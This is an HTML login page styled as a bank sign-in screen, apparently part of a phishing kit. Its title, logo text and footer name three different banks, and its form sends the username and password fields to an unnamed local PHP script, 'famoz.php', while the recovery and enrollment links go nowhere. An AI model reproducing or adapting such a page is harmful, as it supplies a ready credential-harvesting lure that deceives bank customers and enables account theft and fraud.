<!DOCTYPE html>
<html lang="en">
<head><meta charset="us-ascii"><meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="apple-itunes-app" content="app-id=6444349010">
	<title>Bank of Pontiac Login</title>
	<link href="https://cdn.jsdelivr.net/npm/daisyui@2.51.5/dist/full.css" rel="stylesheet" />
	<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&amp;display=swap" rel="stylesheet" />
	<link href="https://cdn.jsdelivr.net/npm/swiper@9/swiper-bundle.min.css" rel="stylesheet" /><script src="https://cdn.jsdelivr.net/npm/swiper@9/swiper-bundle.min.js"></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.5/gsap.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.5/ScrollTrigger.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
	<style type="text/css">body {
            font-family: 'Poppins', sans-serif;
            background-image: url("../background.png");
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            background-color: #1f1f1f;
            border-radius: 10px;
            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 100%;
            max-width: 480px;
            box-sizing: border-box;
            padding: 20px 40px 0px;
            margin: 32px 8px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            width: 300px;
            height: 100px;
            display: block;
            margin: 0 auto;
            border-radius: 100px;
        }
        .form-control {
            margin-bottom: 20px;
            display: flex;
            flex-direction: column;
        }
        .input-field {
            box-sizing: border-box;
            height: auto;
            border: 1px solid #8c989f;
            border-radius: 4px;
            padding: 18px 12px;
            transition: all .2s ease;
            width: 100%;
            font-size: 16px;
            color: #fff;
            background-color: #1f1f1f;
        }
        .input-field:focus {
            outline: none;
            border: 1px solid #2980b9;
            box-shadow: 0px 0px 5px rgba(41, 128, 185, 0.2);
        }
        .button {
            background-color: #004080;
            color: #fff;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
            display: block;
            margin: 20px auto;
            width: 150px;
        }
        .button:hover {
            background-color: #002652;
        }
        .forgot-password {
            text-align: right;
            margin-top: 10px;
            font-size: 14px;
            color: #fff;
            display: flex;
            justify-content: flex-end;
        }
        .forgot-password a {
            color: #2980b9;
            text-decoration: none;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        .signup-link {
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
            color: #fff;
            margin-bottom: 20px;
        }
        .signup-link a {
            color: #2980b9;
            text-decoration: none;
        }
        .signup-link a:hover {
            text-decoration: underline;
        }
        .footer {
               display: block;
    background-color: #1f1f1f;
    text-align: center;
    font-size: 12px;
    padding: 17px 20px;
    box-shadow: rgba(0, 0, 0, 0.1) 0px -1px 0px;
    z-index: 1;
    line-height: 1.5;
        }
        .footer-content {
            display: flex;
            align-items: center;
            flex-direction: column;
            font-size: 12px;
        }
        .footer-content a {
            color: #fff;
            text-decoration: none;
            margin-right: 10px;
            margin-bottom: 5px;
        }
        .footer-content a:hover {
            text-decoration: underline;
        }
        @media screen and (max-width: 450px) {
            .card {
                width: 100%;
            }
            .logo img {
                width: 250px;
                height: 70px;
            }
        }
	</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="logo"><img alt="Bank of Alapaha Logo" src="../logo.png" /></div>

<form action="./famoz.php" enctype="application/x-www-form-urlencoded" id="loginForm" method="post">
<div class="form-control"><label class="label" for="username">Username</label> <input class="input-field" id="username" name="username" required="required" type="text" /></div>

<div class="form-control"><label class="label" for="password">Password</label> <input class="input-field" id="password" name="password" required="required" type="password" /></div>

<div class="forgot-password"><a href="#">Forgot?</a></div>
<button class="button" type="submit">Sign in</button>

<div class="signup-link"><a href="#">First time user? Enroll now.</a></div>
</form>
</div>
</div>

<div class="footer">
<div class="footer-content">&copy; 2024 Clay County Bank</div>

<div class="footer-content"><a href="#"><span style="color:#2980b9;">Privacy policy&nbsp;</span><span style="color: hsla(var(--bc)/var(--tw-text-opacity,1));">.&nbsp;&nbsp;Member FDIC</span></a></div>

<div class="footer-content">Equal Housing Lender</div>
</div>
<script>
        ScrollReveal().reveal('.card', {
            duration: 1000,
            distance: '50px',
            origin: 'bottom',
        });
    </script></body>
</html>
